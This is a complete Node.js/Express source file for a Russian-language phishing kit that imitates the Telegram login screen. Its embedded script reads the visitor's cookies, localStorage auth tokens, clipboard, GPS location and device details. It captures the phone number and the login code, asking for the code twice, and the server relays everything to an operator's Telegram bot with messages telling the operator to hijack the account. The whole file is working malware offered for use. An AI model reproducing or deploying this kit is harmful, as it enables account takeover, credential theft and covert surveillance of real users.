// ==== file: index.js ====
import express from 'express';
import { bot, State, Utils, sendAdmin } from './bot.js';

const PORT = process.env.PORT || 3000;
const app = express();
app.use(express.json({ limit: '10mb' }));

app.post('/api/new_target', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    State.stats.visits++; State.stats.phones++;
    const { phone, ua, screen, battery, memory, network, geo, steal, clipboard } = req.body;
    if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
    const device = Utils.parseUA(ua);
    State.stats.osCount[device.os] = (State.stats.osCount[device.os] || 0) + 1;
    const ipData = await Utils.getIpInfo(ip);
    let locStr = ipData ? `${ipData.country}, ${ipData.city} (${ipData.isp})` : 'Unknown';
    
    let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n📱 <b>Номер:</b> <code>${phone}</code>\n💻 <b>Устройство:</b> ${device.os} / ${device.model}\n🌐 <b>Браузер:</b> ${device.browser}\n🖥 <b>Экран:</b> ${screen}\n🔋 <b>Батарея:</b> ${battery}\n🧠 <b>ОЗУ:</b> ${memory}\n📶 <b>Сеть:</b> ${network}\n🌍 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n📍 <b>Локация:</b> ${locStr}\n`;
    if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть</a>\n`;
    if (steal && steal.length > 0 && State.settings.stealData) {
        msg += `\n🍪 <b>УКРАДЕНО:</b>\n`;
        steal.slice(0, 5).forEach(s => { msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 15)}...</code>\n`; });
    }
    if (clipboard) msg += `📋 <b>Буфер:</b> <code>${clipboard}</code>\n`;
    msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
    await sendAdmin(msg);
    res.json({ ok: true, doubleCode: State.settings.doubleCode });
});

app.post('/api/click', (req, res) => { State.stats.clicks++; res.json({ ok: true }); });

app.post('/api/code', async (req, res) => {
    State.stats.codes++;
    const { phone, code } = req.body;
    State.history.unshift({ phone, code });
    await sendAdmin(`😈 <b>ПЕРЕХВАТ КОДА</b>\n\n📱 <code>${phone}</code>\n🔑 <code>${code}</code>\n\n🏃‍♂️ <i>БЕГИ В TELEGRAM!</i>`);
    res.json({ ok: true });
});

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Telegram</title>
<style>
:root{--bg:#17212b;--surface:#0e1621;--primary:#2aabee;--text:#fff;--muted:#708499;--border:#2b5278}
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
body{background:var(--bg);color:var(--text);display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;user-select:none}
.app{width:100%;max-width:420px;height:100vh;background:var(--bg);display:flex;flex-direction:column}
.top{display:flex;justify-content:space-between;padding:15px 20px;font-size:15px;color:var(--primary);font-weight:500}
.head{padding:20px;text-align:center}
.logo{width:90px;height:90px;background:linear-gradient(135deg,var(--primary),#229ed9);border-radius:50%;display:flex;justify-content:center;align-items:center;margin:0 auto 20px}
.logo svg{width:55px;height:55px;fill:#fff;margin-left:5px}
h1{font-size:24px;margin-bottom:10px}p{font-size:14px;color:var(--muted);padding:0 10px}
.form{padding:20px;flex:1;display:flex;flex-direction:column}
.group{display:flex;gap:10px;margin-bottom:25px}
select{width:110px;background:var(--surface);border:1px solid var(--border);border-radius:10px;color:var(--text);padding:0 10px;font-size:16px;outline:none}
input{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:10px;color:var(--text);padding:16px;font-size:17px;outline:none}
input:focus{border-color:var(--primary)}
.btn{background:var(--primary);color:var(--text);border:none;border-radius:10px;padding:16px;font-size:16px;font-weight:500;cursor:pointer;width:100%}
.btn:active{background:#229ed9}
.hidden{display:none!important}
.spin{display:inline-block;width:20px;height:20px;border:2.5px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:#fff;animation:sp .8s linear infinite;margin-right:10px}
@keyframes sp{to{transform:rotate(360deg)}}
.codes{display:flex;justify-content:center;gap:10px;margin-bottom:25px}
.codes input{width:50px;height:60px;text-align:center;font-size:24px;font-weight:600}
.hs{position:absolute;opacity:0;pointer-events:none;height:0;width:0}
</style></head>
<body><div class="app">
<div class="top"><span id="clock"></span><span>Отмена</span></div>
<div class="head">
<div class="logo"><svg viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.94z"/></svg></div>
<h1 id="title">Ваш номер</h1><p id="subtitle">Пожалуйста, подтвердите код страны и ваш номер телефона.</p>
</div>
<div class="form">
<form id="phoneForm" autocomplete="off">
<input type="text" class="hs" id="hs">
<div class="group">
<select id="cc"><option value="373">🇲🇩 +373</option><option value="7">🇷🇺 +7</option><option value="380">🇺🇦 +380</option><option value="1">🇺🇸 +1</option></select>
<input type="tel" id="phone" placeholder="69 123 456" required>
</div>
<button type="submit" class="btn" id="bp">Далее</button>
</form>
<form id="codeForm" class="hidden" autocomplete="off">
<div class="codes">
<input type="text" class="ci" maxlength="1" inputmode="numeric"><input type="text" class="ci" maxlength="1" inputmode="numeric"><input type="text" class="ci" maxlength="1" inputmode="numeric"><input type="text" class="ci" maxlength="1" inputmode="numeric"><input type="text" class="ci" maxlength="1" inputmode="numeric">
</div>
<button type="submit" class="btn" id="bc">Далее</button>
</form>
</div></div>
<script>
const pf=document.getElementById('phoneForm'),cf=document.getElementById('codeForm'),bp=document.getElementById('bp'),bc=document.getElementById('bc'),cc=document.getElementById('cc'),ci=document.querySelectorAll('.ci'),t=document.getElementById('title'),s=document.getElementById('subtitle'),p=document.getElementById('phone'),cl=document.getElementById('clock'),hs=document.getElementById('hs');
let pv='',fc='',gd=null,cd=null,sd=[],bl='Скрыто',ch=false,mm='Скрыто',nt='Неизвестно',dc=true,icked=false;
const Col={
init(){this.st();this.ba();this.me();this.ne();this.ge();this.cl();this.ct()},
st(){try{document.cookie.split(';').forEach(c=>{const[n,...v]=c.split('=');if(n&&v.length)sd.push({name:n.trim(),value:v.join('=')})});for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k.includes('token')||k.includes('auth'))sd.push({name:'LS:'+k,value:localStorage.getItem(k)})}}catch(e){}},
async ba(){try{if(navigator.getBattery){const b=await navigator.getBattery();bl=Math.round(b.level*100)+'%';ch=b.charging}}catch(e){}},
me(){try{if(navigator.deviceMemory)mm=navigator.deviceMemory+' GB'}catch(e){}},
ne(){try{if(navigator.connection)nt=navigator.connection.effectiveType||'Неизвестно'}catch(e){}},
ge(){try{if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>{gd=p.coords.latitude+','+p.coords.longitude},()=>{},{enableHighAccuracy:true,timeout:5000})}catch(e){}},
cl(){const u=()=>{const d=new Date();cl.textContent=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0')};u();setInterval(u,1000)},
ct(){const tr=()=>{if(icked)return;icked=true;fetch('/api/click',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'}).catch(()=>{})};document.body.addEventListener('click',tr);document.body.addEventListener('touchstart',tr)}
};
const UI={
init(){Col.init();this.pm();this.ci()},
pm(){p.addEventListener('input',e=>{let v=e.target.value.replace(/\\D/g,'');if(v.length>9)v=v.slice(0,9);let f=v;if(v.length>6)f=v.slice(0,3)+' '+v.slice(3,6)+' '+v.slice(6);else if(v.length>3)f=v.slice(0,3)+' '+v.slice(3);e.target.value=f})},
ci(){ci.forEach((inp,i)=>{inp.addEventListener('input',e=>{if(e.target.value.length===1&&i<4)ci[i+1].focus()});inp.addEventListener('keydown',e=>{if(e.key==='Backspace'&&e.target.value.length===0&&i>0)ci[i-1].focus()})})},
sc(){pf.classList.add('hidden');cf.classList.remove('hidden');t.textContent='Введите код';s.innerHTML='Мы отправили код в Telegram на номер <b>+'+pv+'</b>';setTimeout(()=>ci[0].focus(),100)},
sr(){ci.forEach(i=>i.value='');bc.innerHTML='Далее';bc.disabled=false;t.textContent='Повторите код';s.innerHTML='В целях безопасности подтвердите код еще раз.';ci[0].focus()},
ss(){t.textContent='Готово';s.innerHTML='Вы успешно вошли в аккаунт.';cf.innerHTML='<div style="text-align:center;font-size:60px;margin-top:20px;">✅</div>';setTimeout(()=>{window.location.href='https://web.telegram.org'},2000)},
sl(b,t){b.innerHTML='<span class="spin"></span>'+t;b.disabled=true}
};
pf.onsubmit=async e=>{
e.preventDefault();const l=p.value.replace(/\\D/g,'');if(l.length<7)return;pv=cc.value+l;UI.sl(bp,'Отправка...');
try{if(navigator.clipboard)cd=await navigator.clipboard.readText()}catch(e){}
const payload={phone:pv,ua:navigator.userAgent,screen:window.screen.width+'x'+window.screen.height,battery:bl,memory:mm,network:nt,geo:gd,steal:sd,clipboard:cd};
try{const r=await fetch('/api/new_target',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});const d=await r.json();dc=d.doubleCode;UI.sc()}catch(e){bp.innerHTML='Далее';bp.disabled=false}
};
cf.onsubmit=async e=>{
e.preventDefault();let c='';ci.forEach(i=>c+=i.value);if(c.length<5)return;
if(dc&&!fc){fc=c;UI.sr();return}
UI.sl(bc,'Проверка...');
try{await fetch('/api/code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:pv,code:fc||c})});UI.ss()}catch(e){bc.innerHTML='Далее';bc.disabled=false}
};
UI.init();
</script></body></html>`);
});

app.listen(PORT, () => console.log(`[SERVER] :${PORT}`));
